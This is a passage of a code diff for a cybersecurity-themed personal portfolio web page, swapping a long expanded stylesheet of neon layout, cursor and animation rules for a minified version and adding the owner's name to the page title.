@@ -3,1095 +3,453 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Portfolio — CyberSec</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+<title>José Manuel Talavera Ruiz — CyberSec Portfolio</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;700;900&family=Exo+2:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --cyan: #00f5ff;
-    --magenta: #ff00c8;
-    --electric: #7b2fff;
-    --green: #00ff88;
-    --dark: #03050f;
-    --darker: #010208;
-    --card: rgba(0,245,255,0.04);
-    --border: rgba(0,245,255,0.15);
-    --text: #c8e0f0;
-    --glow-cyan: 0 0 20px rgba(0,245,255,0.4), 0 0 60px rgba(0,245,255,0.1);
-    --glow-mag: 0 0 20px rgba(255,0,200,0.4), 0 0 60px rgba(255,0,200,0.1);
-  }
-
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-  html { scroll-behavior: smooth; }
-
-  body {
-    background: var(--darker);
-    color: var(--text);
-    font-family: 'Exo 2', sans-serif;
-    overflow-x: hidden;
-    cursor: none;
-  }
-
-  /* Custom cursor */
-  .cursor {
-    width: 12px; height: 12px;
-    background: var(--cyan);
-    border-radius: 50%;
-    position: fixed;
-    pointer-events: none;
-    z-index: 9999;
-    transform: translate(-50%,-50%);
-    transition: transform 0.1s, width 0.2s, height 0.2s;
-    box-shadow: var(--glow-cyan);
-    mix-blend-mode: screen;
-  }
-  .cursor-ring {
-    width: 36px; height: 36px;
-    border: 1px solid rgba(0,245,255,0.5);
-    border-radius: 50%;
-    position: fixed;
-    pointer-events: none;
-    z-index: 9998;
-    transform: translate(-50%,-50%);
-    transition: transform 0.15s ease-out, width 0.2s, height 0.2s;
-  }
-
-  /* Grid background */
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(0,245,255,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,245,255,0.03) 1px, transparent 1px);
-    background-size: 60px 60px;
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  /* Scanlines */
-  body::after {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background: repeating-linear-gradient(
-      0deg,
-      transparent,
-      transparent 2px,
-      rgba(0,0,0,0.08) 2px,
-      rgba(0,0,0,0.08) 4px
-    );
-    pointer-events: none;
-    z-index: 1;
-  }
-
-  /* ─── NAV ─── */
-  nav {
-    position: fixed;
-    top: 0; left: 0; right: 0;
-    z-index: 100;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 18px 60px;
-    background: rgba(1,2,8,0.85);
-    backdrop-filter: blur(20px);
-    border-bottom: 1px solid var(--border);
-  }
-  .nav-logo {
-    font-family: 'Orbitron', monospace;
-    font-size: 1.1rem;
-    font-weight: 700;
-    color: var(--cyan);
-    text-shadow: var(--glow-cyan);
-    letter-spacing: 3px;
-  }
-  .nav-logo span { color: var(--magenta); }
-  .nav-links { display: flex; gap: 36px; list-style: none; }
-  .nav-links a {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
-    color: rgba(200,224,240,0.6);
-    text-decoration: none;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    transition: color 0.3s;
-    position: relative;
-  }
-  .nav-links a::after {
-    content: '';
-    position: absolute;
-    bottom: -4px; left: 0; right: 0;
-    height: 1px;
-    background: var(--cyan);
-    transform: scaleX(0);
-    transition: transform 0.3s;
-    box-shadow: var(--glow-cyan);
-  }
-  .nav-links a:hover { color: var(--cyan); }
-  .nav-links a:hover::after { transform: scaleX(1); }
-
-  /* ─── HERO ─── */
-  #hero {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    padding: 100px 60px 60px;
-    position: relative;
-    z-index: 2;
-  }
-  .hero-container {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 80px;
-    align-items: center;
-    max-width: 1200px;
-    margin: 0 auto;
-    width: 100%;
-  }
-  .hero-badge {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    color: var(--green);
-    letter-spacing: 3px;
-    text-transform: uppercase;
-    margin-bottom: 20px;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .hero-badge::before {
-    content: '';
-    width: 30px; height: 1px;
-    background: var(--green);
-    box-shadow: 0 0 10px var(--green);
-  }
-  .hero-name {
-    font-family: 'Orbitron', monospace;
-    font-size: clamp(2.5rem, 5vw, 4.2rem);
-    font-weight: 900;
-    line-height: 1.05;
-    color: #fff;
-    text-shadow: var(--glow-cyan);
-    margin-bottom: 8px;
-  }
-  .hero-name .accent { color: var(--cyan); }
-  .hero-role {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 1rem;
-    color: var(--magenta);
-    letter-spacing: 2px;
-    margin-bottom: 28px;
-    text-shadow: var(--glow-mag);
-  }
-  .hero-desc {
-    font-size: 1rem;
-    font-weight: 300;
-    line-height: 1.8;
-    color: rgba(200,224,240,0.75);
-    margin-bottom: 40px;
-    max-width: 480px;
-  }
-  .hero-btns { display: flex; gap: 16px; flex-wrap: wrap; }
-
-  .btn-primary {
-    font-family: 'Orbitron', monospace;
-    font-size: 0.72rem;
-    font-weight: 600;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    padding: 14px 32px;
-    background: transparent;
-    border: 1px solid var(--cyan);
-    color: var(--cyan);
-    text-decoration: none;
-    position: relative;
-    overflow: hidden;
-    transition: color 0.3s;
-    cursor: none;
-  }
-  .btn-primary::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: var(--cyan);
-    transform: translateX(-100%);
-    transition: transform 0.3s;
-    z-index: -1;
-  }
-  .btn-primary:hover { color: var(--darker); }
-  .btn-primary:hover::before { transform: translateX(0); }
-
-  .btn-secondary {
-    font-family: 'Orbitron', monospace;
-    font-size: 0.72rem;
-    font-weight: 600;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    padding: 14px 32px;
-    background: transparent;
-    border: 1px solid rgba(200,224,240,0.2);
-    color: rgba(200,224,240,0.6);
-    text-decoration: none;
-    transition: all 0.3s;
-    cursor: none;
-  }
-  .btn-secondary:hover {
-    border-color: var(--magenta);
-    color: var(--magenta);
-    box-shadow: var(--glow-mag);
-  }
-
-  /* Photo */
-  .hero-photo {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: relative;
-  }
-  .photo-frame {
-    width: 320px; height: 320px;
-    position: relative;
-  }
-  .photo-frame::before, .photo-frame::after {
-    content: '';
-    position: absolute;
-    border: 1px solid var(--cyan);
-    box-shadow: var(--glow-cyan);
-  }
-  .photo-frame::before {
-    inset: -12px;
-    clip-path: polygon(20px 0%, 100% 0%, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0% 100%, 0% 20px);
-    animation: rotate-slow 8s linear infinite;
-  }
-  .photo-frame::after {
-    inset: -24px;
-    border-color: rgba(255,0,200,0.3);
-    clip-path: polygon(0% 20px, 20px 0%, 100% 0%, 100% 100%, 0% 100%);
-    animation: rotate-slow 12s linear infinite reverse;
-  }
-  @keyframes rotate-slow {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-  }
-  .photo-placeholder {
-    width: 100%; height: 100%;
-    background: linear-gradient(135deg, rgba(0,245,255,0.08), rgba(123,47,255,0.12));
-    border: 1px solid var(--border);
-    clip-path: polygon(20px 0%, 100% 0%, 100% calc(100% - 20px), calc(100% - 20px) 100%, 0% 100%, 0% 20px);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    gap: 12px;
-    overflow: hidden;
-    position: relative;
-  }
-  .photo-placeholder img {
-    width: 100%; height: 100%;
-    object-fit: cover;
-    display: block;
-  }
-  .photo-placeholder .photo-hint {
-    position: absolute;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: rgba(0,245,255,0.4);
-    letter-spacing: 2px;
-    text-align: center;
-    padding: 20px;
-    pointer-events: none;
-  }
-  .photo-scanline {
-    position: absolute;
-    width: 100%; height: 2px;
-    background: linear-gradient(90deg, transparent, var(--cyan), transparent);
-    opacity: 0.6;
-    animation: scan 3s linear infinite;
-  }
-  @keyframes scan {
-    0% { top: 0; }
-    100% { top: 100%; }
-  }
-
-  /* Stats row */
-  .hero-stats {
-    display: flex;
-    gap: 40px;
-    margin-top: 48px;
-  }
-  .stat-item { text-align: left; }
-  .stat-num {
-    font-family: 'Orbitron', monospace;
-    font-size: 1.8rem;
-    font-weight: 700;
-    color: var(--cyan);
-    text-shadow: var(--glow-cyan);
-  }
-  .stat-label {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: rgba(200,224,240,0.4);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    margin-top: 4px;
-  }
-
-  /* ─── SECTIONS ─── */
-  section {
-    padding: 100px 60px;
-    position: relative;
-    z-index: 2;
-    max-width: 1200px;
-    margin: 0 auto;
-  }
-
-  .section-header {
-    margin-bottom: 60px;
-    display: flex;
-    align-items: center;
-    gap: 20px;
-  }
-  .section-tag {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: var(--magenta);
-    letter-spacing: 3px;
-    text-transform: uppercase;
-    writing-mode: vertical-rl;
-    transform: rotate(180deg);
-    opacity: 0.7;
-  }
-  .section-title-wrap {}
-  .section-num {
-    font-family: 'Orbitron', monospace;
-    font-size: 0.65rem;
-    color: var(--cyan);
-    letter-spacing: 3px;
-    margin-bottom: 8px;
-    opacity: 0.6;
-  }
-  .section-title {
-    font-family: 'Orbitron', monospace;
-    font-size: clamp(1.6rem, 3vw, 2.4rem);
-    font-weight: 700;
-    color: #fff;
-    text-shadow: var(--glow-cyan);
-    line-height: 1.1;
-  }
-  .section-line {
-    flex: 1;
-    height: 1px;
-    background: linear-gradient(90deg, var(--border), transparent);
-  }
-
-  /* ─── CERTS ─── */
-  .certs-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-    gap: 20px;
-  }
-  .cert-card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    padding: 28px;
-    position: relative;
-    overflow: hidden;
-    transition: border-color 0.3s, transform 0.3s;
-    clip-path: polygon(16px 0%, 100% 0%, 100% calc(100% - 16px), calc(100% - 16px) 100%, 0% 100%, 0% 16px);
-    cursor: default;
-  }
-  .cert-card::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: linear-gradient(135deg, rgba(0,245,255,0.06), transparent);
-    opacity: 0;
-    transition: opacity 0.3s;
-  }
-  .cert-card:hover { border-color: var(--cyan); transform: translateY(-4px); }
-  .cert-card:hover::before { opacity: 1; }
-  .cert-icon {
-    font-size: 2rem;
-    margin-bottom: 16px;
-  }
-  .cert-name {
-    font-family: 'Orbitron', monospace;
-    font-size: 0.85rem;
-    font-weight: 600;
-    color: #fff;
-    margin-bottom: 6px;
-    letter-spacing: 1px;
-  }
-  .cert-issuer {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-    color: var(--cyan);
-    letter-spacing: 1px;
-    margin-bottom: 14px;
-  }
-  .cert-date {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: rgba(200,224,240,0.35);
-    letter-spacing: 2px;
-  }
-  .cert-status {
-    position: absolute;
-    top: 20px; right: 20px;
-    width: 8px; height: 8px;
-    border-radius: 50%;
-    background: var(--green);
-    box-shadow: 0 0 10px var(--green);
-    animation: pulse 2s infinite;
-  }
-  @keyframes pulse {
-    0%,100% { opacity: 1; }
-    50% { opacity: 0.3; }
-  }
-
-  /* ─── PROJECTS ─── */
-  .projects-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-    gap: 24px;
-  }
-  .project-card {
-    background: var(--card);
-    border: 1px solid var(--border);
-    padding: 32px;
-    position: relative;
-    overflow: hidden;
-    transition: border-color 0.3s, transform 0.3s;
-    cursor: default;
-  }
-  .project-card::after {
-    content: '';
-    position: absolute;
-    top: 0; left: 0;
-    width: 3px; height: 100%;
-    background: linear-gradient(180deg, var(--cyan), var(--magenta));
-    transform: scaleY(0);
-    transition: transform 0.3s;
-    transform-origin: top;
-  }
-  .project-card:hover { border-color: rgba(0,245,255,0.3); transform: translateY(-4px); }
-  .project-card:hover::after { transform: scaleY(1); }
-  .project-tags {
-    display: flex;
-    gap: 8px;
-    flex-wrap: wrap;
-    margin-bottom: 18px;
-  }
-  .tag {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem;
-    padding: 4px 10px;
-    border: 1px solid var(--border);
-    color: rgba(200,224,240,0.5);
-    letter-spacing: 1px;
-    text-transform: uppercase;
-  }
-  .tag.cyan { border-color: rgba(0,245,255,0.4); color: var(--cyan); }
-  .tag.mag { border-color: rgba(255,0,200,0.4); color: var(--magenta); }
-  .tag.green { border-color: rgba(0,255,136,0.4); color: var(--green); }
-  .project-title {
-    font-family: 'Orbitron', monospace;
-    font-size: 1rem;
-    font-weight: 600;
-    color: #fff;
-    margin-bottom: 12px;
-    letter-spacing: 1px;
-  }
-  .project-desc {
-    font-size: 0.87rem;
-    font-weight: 300;
-    line-height: 1.7;
-    color: rgba(200,224,240,0.6);
-    margin-bottom: 24px;
-  }
-  .project-link {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-    color: var(--cyan);
-    text-decoration: none;
-    letter-spacing: 2px;
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    transition: gap 0.3s;
-  }
-  .project-link::after { content: '→'; }
-  .project-link:hover { gap: 14px; }
-
-  /* ─── WRITEUPS ─── */
-  .writeups-list { display: flex; flex-direction: column; gap: 1px; }
-  .writeup-item {
-    display: grid;
-    grid-template-columns: 80px 1fr auto;
-    align-items: center;
-    gap: 30px;
-    padding: 24px 28px;
-    border: 1px solid var(--border);
-    background: var(--card);
-    transition: background 0.3s, border-color 0.3s;
-    cursor: default;
-    position: relative;
-    overflow: hidden;
-  }
-  .writeup-item::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: linear-gradient(90deg, rgba(0,245,255,0.04), transparent);
-    opacity: 0;
-    transition: opacity 0.3s;
-  }
-  .writeup-item:hover { border-color: rgba(0,245,255,0.3); }
-  .writeup-item:hover::before { opacity: 1; }
-  .writeup-difficulty {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    text-align: center;
-    padding: 6px 10px;
-    border: 1px solid;
-  }
-  .diff-easy { color: var(--green); border-color: rgba(0,255,136,0.4); }
-  .diff-medium { color: #ffa500; border-color: rgba(255,165,0,0.4); }
-  .diff-hard { color: var(--magenta); border-color: rgba(255,0,200,0.4); }
-  .diff-insane { color: var(--cyan); border-color: rgba(0,245,255,0.4); }
-  .writeup-info {}
-  .writeup-title {
-    font-family: 'Orbitron', monospace;
-    font-size: 0.88rem;
-    font-weight: 600;
-    color: #fff;
-    letter-spacing: 1px;
-    margin-bottom: 6px;
-  }
-  .writeup-meta {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: rgba(200,224,240,0.35);
-    letter-spacing: 1px;
-  }
-  .writeup-link {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    color: var(--cyan);
-    text-decoration: none;
-    letter-spacing: 2px;
-    opacity: 0;
-    transition: opacity 0.3s;
-    white-space: nowrap;
-  }
-  .writeup-item:hover .writeup-link { opacity: 1; }
-
-  /* ─── CONTACT ─── */
-  #contact { text-align: center; }
-  .contact-wrapper {
-    max-width: 600px;
-    margin: 0 auto;
-  }
-  .contact-intro {
-    font-size: 1rem;
-    font-weight: 300;
-    line-height: 1.8;
-    color: rgba(200,224,240,0.6);
-    margin-bottom: 48px;
-  }
-  .social-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-    gap: 12px;
-    margin-bottom: 40px;
-  }
-  .social-link {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-    padding: 16px 20px;
-    border: 1px solid var(--border);
-    background: var(--card);
-    text-decoration: none;
-    color: rgba(200,224,240,0.6);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    transition: all 0.3s;
-  }
-  .social-link:hover {
-    border-color: var(--cyan);
-    color: var(--cyan);
-    box-shadow: var(--glow-cyan);
-    background: rgba(0,245,255,0.05);
-  }
-  .social-link svg { width: 16px; height: 16px; fill: currentColor; }
-  .email-btn {
-    display: inline-flex;
-    align-items: center;
-    gap: 12px;
-    font-family: 'Orbitron', monospace;
-    font-size: 0.75rem;
-    font-weight: 600;
-    letter-spacing: 3px;
-    text-transform: uppercase;
-    padding: 18px 48px;
-    border: 1px solid var(--magenta);
-    color: var(--magenta);
-    text-decoration: none;
-    position: relative;
-    overflow: hidden;
-    transition: color 0.3s;
-  }
-  .email-btn::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: var(--magenta);
-    transform: translateX(-100%);
-    transition: transform 0.3s;
-    z-index: -1;
-  }
-  .email-btn:hover { color: var(--darker); }
-  .email-btn:hover::before { transform: translateX(0); }
-
-  /* ─── FOOTER ─── */
-  footer {
-    text-align: center;
-    padding: 40px 60px;
-    border-top: 1px solid var(--border);
-    position: relative;
-    z-index: 2;
-  }
-  footer p {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    color: rgba(200,224,240,0.25);
-    letter-spacing: 2px;
-  }
-  footer span { color: var(--cyan); }
-
-  /* ─── ANIMATIONS ─── */
-  .fade-in {
-    opacity: 0;
-    transform: translateY(30px);
-    transition: opacity 0.7s ease, transform 0.7s ease;
-  }
-  .fade-in.visible { opacity: 1; transform: translateY(0); }
-
-  /* Terminal typing effect */
-  .typed::after {
-    content: '|';
-    animation: blink 0.7s step-end infinite;
-    color: var(--cyan);
-  }
-  @keyframes blink { 50% { opacity: 0; } }
-
-  /* Glitch effect on name */
-  .glitch {
-    position: relative;
-  }
-  .glitch::before, .glitch::after {
-    content: attr(data-text);
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    clip: rect(0,0,0,0);
-  }
-  .glitch::before {
-    color: var(--magenta);
-    animation: glitch-1 4s infinite linear;
-  }
-  .glitch::after {
-    color: var(--cyan);
-    animation: glitch-2 4s infinite linear;
-  }
-  @keyframes glitch-1 {
-    0%,90%,100% { clip: rect(0,9999px,0,0); transform: none; }
-    92% { clip: rect(20px,9999px,40px,0); transform: translateX(-3px); }
-    94% { clip: rect(60px,9999px,80px,0); transform: translateX(2px); }
-    96% { clip: rect(10px,9999px,30px,0); transform: translateX(-1px); }
-  }
-  @keyframes glitch-2 {
-    0%,91%,100% { clip: rect(0,9999px,0,0); transform: none; }
-    93% { clip: rect(40px,9999px,60px,0); transform: translateX(3px); }
-    95% { clip: rect(0px,9999px,20px,0); transform: translateX(-2px); }
-    97% { clip: rect(70px,9999px,90px,0); transform: translateX(1px); }
-  }
-
-  /* Floating particles */
-  .particles { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
-  .particle {
-    position: absolute;
-    width: 2px; height: 2px;
-    background: var(--cyan);
-    border-radius: 50%;
-    animation: float-up linear infinite;
-    opacity: 0;
-  }
-  @keyframes float-up {
-    0% { transform: translateY(100vh) translateX(0); opacity: 0; }
-    10% { opacity: 0.6; }
-    90% { opacity: 0.3; }
-    100% { transform: translateY(-10vh) translateX(var(--drift)); opacity: 0; }
-  }
-
-  /* Responsive */
-  @media (max-width: 768px) {
-    nav { padding: 16px 24px; }
-    .nav-links { display: none; }
-    #hero { padding: 100px 24px 60px; }
-    .hero-container { grid-template-columns: 1fr; gap: 48px; }
-    .hero-photo { order: -1; }
-    .photo-frame { width: 200px; height: 200px; }
-    section { padding: 80px 24px; }
-    .hero-stats { gap: 24px; }
-    .writeup-item { grid-template-columns: 1fr; gap: 12px; }
-    footer { padding: 30px 24px; }
-  }
+:root{--c:#00f5ff;--m:#ff00c8;--g:#00ff88;--o:#ff8c00;--dk:#010208;--bd:rgba(0,245,255,.12);--tx:#c8e0f0;--gc:0 0 20px rgba(0,245,255,.45),0 0 60px rgba(0,245,255,.1);--gm:0 0 20px rgba(255,0,200,.45);}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--dk);color:var(--tx);font-family:'Exo 2',sans-serif;overflow-x:hidden;cursor:none;}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,245,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,245,255,.025) 1px,transparent 1px);background-size:55px 55px;pointer-events:none;z-index:0;}
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 4px);pointer-events:none;z-index:1;}
+.cur{width:10px;height:10px;background:var(--c);border-radius:50%;position:fixed;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:var(--gc);mix-blend-mode:screen;}
+.cur-ring{width:30px;height:30px;border:1px solid rgba(0,245,255,.35);border-radius:50%;position:fixed;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:left .12s ease-out,top .12s ease-out;}
+.ptc{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden;}
+.pt{position:absolute;width:2px;height:2px;border-radius:50%;animation:fup linear infinite;opacity:0;}
+@keyframes fup{0%{transform:translateY(100vh) translateX(0);opacity:0;}10%{opacity:.5;}90%{opacity:.2;}100%{transform:translateY(-10vh) translateX(var(--d));opacity:0;}}
+nav{position:fixed;top:0;left:0;right:0;z-index:200;display:flex;justify-content:space-between;align-items:center;padding:16px 56px;background:rgba(1,2,8,.9);backdrop-filter:blur(20px);border-bottom:1px solid var(--bd);}
+.nl{font-family:'Orbitron',monospace;font-size:1rem;font-weight:700;color:var(--c);text-shadow:var(--gc);letter-spacing:3px;}
+.nl span{color:var(--m);}
+nav ul{display:flex;gap:32px;list-style:none;}
+nav ul a{font-family:'Share Tech Mono',monospace;font-size:.72rem;color:rgba(200,224,240,.5);text-decoration:none;letter-spacing:2px;text-transform:uppercase;transition:color .3s;position:relative;}
+nav ul a::after{content:'';position:absolute;bottom:-4px;left:0;right:0;height:1px;background:var(--c);transform:scaleX(0);transition:transform .3s;}
+nav ul a:hover{color:var(--c);}
+nav ul a:hover::after{transform:scaleX(1);}
+#hero{min-height:100vh;display:flex;align-items:center;padding:100px 56px 60px;position:relative;z-index:2;}
+.hi{display:grid;grid-template-columns:1fr 1fr;gap:80px;align-items:center;max-width:1200px;margin:0 auto;width:100%;}
+.hbadge{font-family:'Share Tech Mono',monospace;font-size:.68rem;color:var(--g);letter-spacing:3px;text-transform:uppercase;margin-bottom:18px;display:flex;align-items:center;gap:10px;}
+.hbadge::before{content:'';width:28px;height:1px;background:var(--g);box-shadow:0 0 10px var(--g);}
+.hname{font-family:'Orbitron',monospace;font-size:clamp(2rem,4.5vw,3.6rem);font-weight:900;line-height:1.05;color:#fff;text-shadow:var(--gc);margin-bottom:6px;}
+.hname .ac{color:var(--c);}
+.hrole{font-family:'Share Tech Mono',monospace;font-size:.95rem;color:var(--m);letter-spacing:2px;margin-bottom:10px;text-shadow:var(--gm);}
+.hrole::after{content:'|';animation:blink .7s step-end infinite;color:var(--c);}
+@keyframes blink{50%{opacity:0;}}
+.hloc{font-family:'Share Tech Mono',monospace;font-size:.68rem;color:rgba(200,224,240,.4);letter-spacing:2px;margin-bottom:26px;}
+.hdesc{font-size:.95rem;font-weight:300;line-height:1.8;color:rgba(200,224,240,.7);margin-bottom:36px;max-width:470px;}
+.hbtns{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:44px;}
+.bp{font-family:'Orbitron',monospace;font-size:.68rem;font-weight:600;letter-spacing:2px;text-transform:uppercase;padding:13px 30px;background:transparent;border:1px solid var(--c);color:var(--c);text-decoration:none;position:relative;overflow:hidden;transition:color .3s;cursor:none;display:inline-block;}
+.bp::before{content:'';position:absolute;inset:0;background:var(--c);transform:translateX(-100%);transition:transform .3s;z-index:-1;}
+.bp:hover{color:#010208;}
+.bp:hover::before{transform:translateX(0);}
+.bs{font-family:'Orbitron',monospace;font-size:.68rem;font-weight:600;letter-spacing:2px;text-transform:uppercase;padding:13px 30px;background:transparent;border:1px solid rgba(200,224,240,.2);color:rgba(200,224,240,.55);text-decoration:none;transition:all .3s;cursor:none;display:inline-block;}
+.bs:hover{border-color:var(--m);color:var(--m);box-shadow:var(--gm);}
+.hstats{display:flex;gap:36px;}
+.sn{font-family:'Orbitron',monospace;font-size:1.7rem;font-weight:700;color:var(--c);text-shadow:var(--gc);}
+.sl{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:rgba(200,224,240,.35);letter-spacing:2px;text-transform:uppercase;margin-top:3px;}
+.hphoto{display:flex;justify-content:center;align-items:center;}
+.pframe{width:300px;height:300px;position:relative;}
+.pframe::before,.pframe::after{content:'';position:absolute;border:1px solid var(--c);box-shadow:var(--gc);}
+.pframe::before{inset:-14px;clip-path:polygon(20px 0%,100% 0%,100% calc(100% - 20px),calc(100% - 20px) 100%,0% 100%,0% 20px);animation:rot 9s linear infinite;}
+.pframe::after{inset:-26px;border-color:rgba(255,0,200,.3);clip-path:polygon(0% 20px,20px 0%,100% 0%,100% 100%,0% 100%);animation:rot 14s linear infinite reverse;}
+@keyframes rot{to{transform:rotate(360deg);}}
+.pinner{width:100%;height:100%;clip-path:polygon(20px 0%,100% 0%,100% calc(100% - 20px),calc(100% - 20px) 100%,0% 100%,0% 20px);background:linear-gradient(135deg,rgba(0,245,255,.07),rgba(123,47,255,.1));border:1px solid var(--bd);display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;}
+.pinner img{width:100%;height:100%;object-fit:cover;}
+.phint{position:absolute;font-family:'Share Tech Mono',monospace;font-size:.6rem;color:rgba(0,245,255,.4);letter-spacing:2px;text-align:center;padding:16px;}
+.scanl{position:absolute;width:100%;height:2px;background:linear-gradient(90deg,transparent,var(--c),transparent);opacity:.5;animation:scan 3s linear infinite;}
+@keyframes scan{0%{top:0;}100%{top:100%;}}
+.sw{max-width:1200px;margin:0 auto;padding:90px 56px;position:relative;z-index:2;}
+.sh{display:flex;align-items:center;gap:18px;margin-bottom:52px;}
+.stag{font-family:'Share Tech Mono',monospace;font-size:.58rem;color:var(--m);letter-spacing:3px;text-transform:uppercase;writing-mode:vertical-rl;transform:rotate(180deg);opacity:.55;}
+.snum{font-family:'Orbitron',monospace;font-size:.6rem;color:var(--c);letter-spacing:3px;opacity:.5;margin-bottom:6px;}
+.stitle{font-family:'Orbitron',monospace;font-size:clamp(1.5rem,2.8vw,2.2rem);font-weight:700;color:#fff;text-shadow:var(--gc);}
+.sline{flex:1;height:1px;background:linear-gradient(90deg,var(--bd),transparent);}
+.fi{opacity:0;transform:translateY(28px);transition:opacity .7s ease,transform .7s ease;}
+.fi.vis{opacity:1;transform:translateY(0);}
+/* CERTS */
+.cgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px;}
+.cc{background:rgba(0,245,255,.03);border:1px solid var(--bd);padding:26px;position:relative;overflow:hidden;transition:border-color .3s,transform .3s;clip-path:polygon(14px 0%,100% 0%,100% calc(100% - 14px),calc(100% - 14px) 100%,0% 100%,0% 14px);}
+.cc::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,245,255,.06),transparent);opacity:0;transition:opacity .3s;}
+.cc:hover{border-color:var(--c);transform:translateY(-4px);}
+.cc:hover::before{opacity:1;}
+.cdot{position:absolute;top:18px;right:18px;width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.3;}}
+.cico{font-size:1.8rem;margin-bottom:14px;}
+.cname{font-family:'Orbitron',monospace;font-size:.82rem;font-weight:600;color:#fff;margin-bottom:5px;}
+.ciss{font-family:'Share Tech Mono',monospace;font-size:.67rem;color:var(--c);letter-spacing:1px;margin-bottom:8px;}
+.cdate{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:rgba(200,224,240,.35);letter-spacing:1px;margin-bottom:4px;}
+.cid{font-family:'Share Tech Mono',monospace;font-size:.58rem;color:rgba(0,245,255,.4);letter-spacing:1px;margin-bottom:10px;}
+.cbadge{font-family:'Share Tech Mono',monospace;font-size:.55rem;padding:3px 8px;border:1px solid rgba(0,255,136,.3);color:var(--g);letter-spacing:1px;text-transform:uppercase;display:inline-block;}
+.agrid{display:grid;grid-template-columns:1fr 1fr;gap:28px;margin-top:10px;}
+.acard{background:rgba(0,245,255,.03);border:1px solid var(--bd);padding:24px 28px;position:relative;overflow:hidden;}
+.acard::before{content:'';position:absolute;top:0;left:0;width:2px;height:100%;background:linear-gradient(180deg,var(--c),var(--m));}
+.actitle{font-family:'Orbitron',monospace;font-size:.7rem;color:var(--c);letter-spacing:2px;margin-bottom:12px;text-transform:uppercase;}
+.tags{display:flex;flex-wrap:wrap;gap:8px;}
+.stk{font-family:'Share Tech Mono',monospace;font-size:.62rem;padding:4px 10px;border:1px solid rgba(0,245,255,.2);color:rgba(0,245,255,.65);background:rgba(0,245,255,.04);}
+/* WRITEUPS */
+.wfilters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px;align-items:center;}
